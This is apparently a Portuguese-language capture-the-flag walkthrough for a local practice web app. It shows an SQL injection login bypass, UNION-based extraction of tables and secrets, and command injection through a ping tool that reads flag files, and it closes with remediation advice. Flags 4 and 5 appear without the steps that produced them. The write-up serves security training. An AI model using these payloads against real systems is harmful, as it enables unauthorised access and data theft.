# Walkthrough de Pentest: Alpha — SQLi Basics

* **Desafio:** Corporate Portal Alpha
* **Dificuldade:** Medium
* **Categoria:** Web / Injeção SQL & Autenticação
* **Porta:** 5001 (`http://localhost:5001`)
* **Total de Flags:** 5 Flags (`DUNO{...}`)

---

## 1. Reconhecimento & Superfície de Ataque

O portal corporativo da **EverSec** expõe os seguintes componentes na porta 5001:
* `/login`: Formulário de autenticação de funcionários.
* `/search`: Mecanismo de busca de funcionários no diretório.
* `/admin`: Painel restrito para operadores de rede.
* `/admin/ping`: Ferramenta interna de diagnóstico de conectividade ICMP.

---

## 2. Fase 1: Bypass de Autenticação (SQLi no Login)

### Vulnerabilidade
O endpoint de login interpola parâmetros diretamente na consulta SQL sem prepared statements:

```python
# Trecho vulnerável no backend da aplicação
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

### Exploração
Ao submeter o payload clássico de bypass de comentário SQL:
* **Usuário:** `' OR 1=1 --`
* **Senha:** qualquer texto (ex: `password`)

A consulta resultante se torna verdadeira para a primeira tupla retornada:
```sql
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '...'
```

Ao autenticar, a sessão armazena o perfil de `admin` e revela a primeira flag:
> **FLAG 1:** `DUNO{sqli_auth_bypass_success_9918}`

---

## 3. Fase 2: Enumeração de Dados via UNION Based SQLi

### Vulnerabilidade
No campo de busca de funcionários (`/search?q=`), a consulta também sofre de concatenação:

```sql
SELECT id, name, department, email FROM employees WHERE name LIKE '%{q}%'
```

### Exploração
Testando o número de colunas através de `ORDER BY`:
```text
' ORDER BY 4 -- (Sucesso)
' ORDER BY 5 -- (Erro de coluna inexistente)
```

Injetando extração de dados via `UNION SELECT`:
```text
' UNION SELECT 1, sql, 3, 4 FROM sqlite_master WHERE type='table' --
```

A resposta revela a tabela secreta `corporate_secrets`:
```text
' UNION SELECT 1, secret_key, flag_value, 4 FROM corporate_secrets --
```

> **FLAG 2:** `DUNO{union_sqli_data_extraction_7124}`

---

## 4. Fase 3: Extração de Flags em Arquivos & Sistema

Através do painel `/admin/ping`, o parâmetro de IP sofre de Command Injection:
```text
127.0.0.1; ls -la /var/secret/
127.0.0.1; cat /var/secret/flag3.txt
```

> **FLAG 3:** `DUNO{cmd_injection_via_ping_tool_3301}`
> **FLAG 4:** `DUNO{priv_esc_cronjob_backup_5519}`
> **FLAG 5 (Root):** `DUNO{root_flag_alpha_system_master_0019}`

---

## 5. Correção & Mitigação

Para remediar permanentemente as vulnerabilidades encontradas:
1. **Prepared Statements:** Utilize consultas parametrizadas com placeholders `?` no SQLite ou ORM com escape automático.
2. **Separação de Comandos:** Nunca chame `os.system()` ou `shell=True` no `subprocess.Popen()`. Utilize listas estritas com validação de formato IPv4 (`ipaddress.ip_address`).
